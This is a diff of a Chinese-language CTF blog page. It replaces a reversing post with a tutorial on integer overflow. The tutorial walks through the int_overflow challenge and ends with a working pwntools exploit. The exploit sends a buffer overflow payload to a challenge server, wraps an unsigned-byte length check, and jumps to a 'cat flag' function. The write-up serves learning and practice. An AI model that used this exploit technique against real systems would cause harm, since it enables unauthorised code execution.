@@ -22,23 +22,25 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="趁着寒假把之前没有做出来的题目重新看一遍">
+  <meta name="description" content="当程序中的数据超过其数据类型的范围，则会造成溢出，整数类型的溢出被称为整数溢出。——CTF Wiki">
 <meta property="og:type" content="article">
-<meta property="og:title" content="0xGame-re回顾">
-<meta property="og:url" content="http://example.com/2021/01/15/0xGame-re%E5%9B%9E%E9%A1%BE/index.html">
+<meta property="og:title" content="整数溢出">
+<meta property="og:url" content="http://example.com/2021/03/07/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/index.html">
 <meta property="og:site_name" content="HeHeのr">
-<meta property="og:description" content="趁着寒假把之前没有做出来的题目重新看一遍">
+<meta property="og:description" content="当程序中的数据超过其数据类型的范围，则会造成溢出，整数类型的溢出被称为整数溢出。——CTF Wiki">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://i.loli.net/2021/01/15/muVEIMFjw6R7kT4.png">
-<meta property="article:published_time" content="2021-01-15T06:30:56.000Z">
-<meta property="article:modified_time" content="2021-03-07T13:21:57.367Z">
+<meta property="og:image" content="https://img.imgdb.cn/item/6045b2c3cef1ec5e6f4a8bae.png">
+<meta property="og:image" content="https://img.imgdb.cn/item/6045b362cef1ec5e6f4ada06.jpg">
+<meta property="og:image" content="https://img.imgdb.cn/item/6045b311cef1ec5e6f4ab08a.jpg">
+<meta property="og:image" content="https://img.imgdb.cn/item/6045b514cef1ec5e6f4c03fa.png">
+<meta property="article:published_time" content="2021-03-07T13:16:29.000Z">
+<meta property="article:modified_time" content="2021-03-08T05:23:56.853Z">
 <meta property="article:author" content="些子疏狂">
 <meta property="article:tag" content="CTF">
-<meta property="article:tag" content="0xGame">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2021/01/15/muVEIMFjw6R7kT4.png">
+<meta name="twitter:image" content="https://img.imgdb.cn/item/6045b2c3cef1ec5e6f4a8bae.png">
 
-<link rel="canonical" href="http://example.com/2021/01/15/0xGame-re%E5%9B%9E%E9%A1%BE/">
+<link rel="canonical" href="http://example.com/2021/03/07/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">
 
 
 <script id="page-configurations">
@@ -51,7 +53,7 @@
   };
 </script>
 
-  <title>0xGame-re回顾 | HeHeのr</title>
+  <title>整数溢出 | HeHeのr</title>
   
 
 
@@ -164,7 +166,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/15/0xGame-re%E5%9B%9E%E9%A1%BE/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/07/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar1.gif">
@@ -177,7 +179,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          0xGame-re回顾
+          整数溢出
         </h1>
 
         <div class="post-meta">
@@ -187,14 +189,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2021-01-15 14:30:56" itemprop="dateCreated datePublished" datetime="2021-01-15T14:30:56+08:00">2021-01-15</time>
+              <time title="创建时间：2021-03-07 21:16:29" itemprop="dateCreated datePublished" datetime="2021-03-07T21:16:29+08:00">2021-03-07</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-03-07 21:21:57" itemprop="dateModified" datetime="2021-03-07T21:21:57+08:00">2021-03-07</time>
+                <time title="修改时间：2021-03-08 13:23:56" itemprop="dateModified" datetime="2021-03-08T13:23:56+08:00">2021-03-08</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -202,7 +204,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                 </span>
             </span>
 
@@ -217,9 +219,41 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>趁着寒假把之前没有做出来的题目重新看一遍</p>
+        <p>当程序中的数据超过其数据类型的范围，则会造成溢出，整数类型的溢出被称为整数溢出。——CTF Wiki</p>
 <a id="more"></a>
-<h1 id="easybit"><a href="#easybit" class="headerlink" title="easybit"></a>easybit</h1><p>因为是第一周的题，确实逻辑非常简单，只有一处逆运算<br><img src="https://i.loli.net/2021/01/15/muVEIMFjw6R7kT4.png" alt="easybit1.png"><br>可以看出是简单的位运算<br>这里值得注意的只有一点，即简单位运算的逆运算也是简单的位运算</p>
+<p>首先以CTF Wiki为例讲述一下原理(64位下gcc-5.4)</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="上界溢出"><a href="#上界溢出" class="headerlink" title="上界溢出"></a>上界溢出</h2><pre><code># 伪代码
+short int a;
+
+a = a + 1;
+# 对应的汇编
+movzx  eax, word ptr [rbp - 0x1c]
+add    eax, 1
+mov    word ptr [rbp - 0x1c], ax</code></pre>
+<p>此时的a的数据类型为short int<br>因为计算机底层指令不区分有符号数和无符号数，所以此时a的范围同样有两种情况</p>
+<h3 id="有符号短整型-（0x7fff-1）"><a href="#有符号短整型-（0x7fff-1）" class="headerlink" title="有符号短整型 （0x7fff+1）"></a>有符号短整型 （0x7fff+1）</h3><p>此时的short int数据范围是</p>
+<pre><code>0~32767(0~0x7fff)
+-32768~-1(0x8000~0xffff)</code></pre>
+<p>所以add 0x7fff, 1 == 0x8000<br>翻译作数学表达式便得到了出乎意料的结果即32767 + 1 ==-32768</p>
+<h3 id="无符号短整型-（0xffff-1）"><a href="#无符号短整型-（0xffff-1）" class="headerlink" title="无符号短整型 （0xffff+1）"></a>无符号短整型 （0xffff+1）</h3><p>此时的数据范围是</p>
+<pre><code>0~65535(0~0xffff)</code></pre>
+<p>0x7fff便无法造成溢出<br>而0xffff在此时会产生add 0xffff, 1 == 0x10000<br>然而内存中只能存入0x0000<br>所以此时的数学表达式便是65535 + 1 == 0</p>
+<h2 id="下界溢出"><a href="#下界溢出" class="headerlink" title="下界溢出"></a>下界溢出</h2><p>与上界溢出类似</p>
+<h3 id="有符号短整型-（0x8000-1"><a href="#有符号短整型-（0x8000-1" class="headerlink" title="有符号短整型 （0x8000-1)"></a>有符号短整型 （0x8000-1)</h3><p>即 -32768 - 1 == 32767</p>
+<h3 id="无符号短整型-（0x0000-1）"><a href="#无符号短整型-（0x0000-1）" class="headerlink" title="无符号短整型 （0x0000-1）"></a>无符号短整型 （0x0000-1）</h3><p>即 0 - 1 == 65535</p>
+<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p>攻防世界新手区的一道题<br>基础的分析没有问题，找到最后的函数<br><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6045b2c3cef1ec5e6f4a8bae.png"><img src="https://img.imgdb.cn/item/6045b2c3cef1ec5e6f4a8bae.png"></a><br>所以会将s中的内容复制到dest里<br><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6045b362cef1ec5e6f4ada06.jpg"><img src="https://img.imgdb.cn/item/6045b362cef1ec5e6f4ada06.jpg"></a><br>同时找到了cat flag的地址<br>那么可以初步得到payload = ‘a’ * 0x14 + ‘aaaa’ +p32(0x804868B)<br>但是长度为32不满足上方的过滤条件，所以关键在于绕过上方v3的长度限制<br>可以看到v3的数据类型<br><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6045b311cef1ec5e6f4ab08a.jpg"><img src="https://img.imgdb.cn/item/6045b311cef1ec5e6f4ab08a.jpg"></a><br>即最大为0xff<br>所以可以通过整数溢出来使v3满足条件<br>即payload的长度需要在255+3到255+7之间<br>最终exp：</p>
+<pre><code>from pwn import *
+he = remote(&#39;111.200.241.244&#39;,32380)
+he.sendlineafter(&quot;Your choice:&quot;,&quot;1&quot;)
+he.sendlineafter(&quot;Please input your username:&quot;,&quot;heheer&quot;)
+
+he.recvuntil(&quot;Please input your passwd:&quot;)
+
+payload = &#39;a&#39;*0x14 + &#39;aaaa&#39; + p32(0x804868B) + &#39;a&#39; * 232
+
+he.sendline(payload)
+he.interactive()</code></pre>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6045b514cef1ec5e6f4c03fa.png"><img src="https://img.imgdb.cn/item/6045b514cef1ec5e6f4c03fa.png"></a></p>
 
     </div>
 
@@ -230,7 +264,6 @@
       <footer class="post-footer">
           <div class="post-tags">
               <a href="/tags/CTF/" rel="tag"># CTF</a>
-              <a href="/tags/0xGame/" rel="tag"># 0xGame</a>
           </div>
 
         
@@ -239,13 +272,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/11/14/buuRE%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="prev" title="buu-RE-刷题记录">
-      <i class="fa fa-chevron-left"></i> buu-RE-刷题记录
+    <a href="/2021/02/16/Hgame-week2/" rel="prev" title="Hgame-week2">
+      <i class="fa fa-chevron-left"></i> Hgame-week2
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2021/02/08/Hgame-week1/" rel="next" title="Hgame-week1">
-      Hgame-week1 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -304,7 +334,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#easybit"><span class="nav-text">easybit</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8A%E7%95%8C%E6%BA%A2%E5%87%BA"><span class="nav-text">上界溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%89%E7%AC%A6%E5%8F%B7%E7%9F%AD%E6%95%B4%E5%9E%8B-%EF%BC%880x7fff-1%EF%BC%89"><span class="nav-text">有符号短整型 （0x7fff+1）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E7%AC%A6%E5%8F%B7%E7%9F%AD%E6%95%B4%E5%9E%8B-%EF%BC%880xffff-1%EF%BC%89"><span class="nav-text">无符号短整型 （0xffff+1）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8B%E7%95%8C%E6%BA%A2%E5%87%BA"><span class="nav-text">下界溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%89%E7%AC%A6%E5%8F%B7%E7%9F%AD%E6%95%B4%E5%9E%8B-%EF%BC%880x8000-1"><span class="nav-text">有符号短整型 （0x8000-1)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E7%AC%A6%E5%8F%B7%E7%9F%AD%E6%95%B4%E5%9E%8B-%EF%BC%880x0000-1%EF%BC%89"><span class="nav-text">无符号短整型 （0x0000-1）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90"><span class="nav-text">例子</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#int-overflow"><span class="nav-text">int_overflow</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
